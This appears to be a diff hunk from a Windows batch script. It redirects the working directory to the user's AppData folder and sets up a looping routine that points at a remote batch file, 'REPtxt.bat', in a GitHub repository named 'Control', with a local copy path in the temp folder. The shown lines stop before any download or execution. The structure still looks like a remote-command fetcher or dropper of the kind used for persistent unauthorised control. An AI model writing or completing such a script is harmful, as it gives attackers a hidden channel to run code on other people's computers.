@@ -1,4 +1,4 @@
-@echo off && cd C:\Program Files (x86)
+@echo off && cd users\%username%\AppData
 :begin
 Set "url=https://raw.githubusercontent.com/Guest257351/Control/main/REPtxt.bat"
 for %%# in (%url%) do ( set "File=%tmp%\%%~n#.txt" )
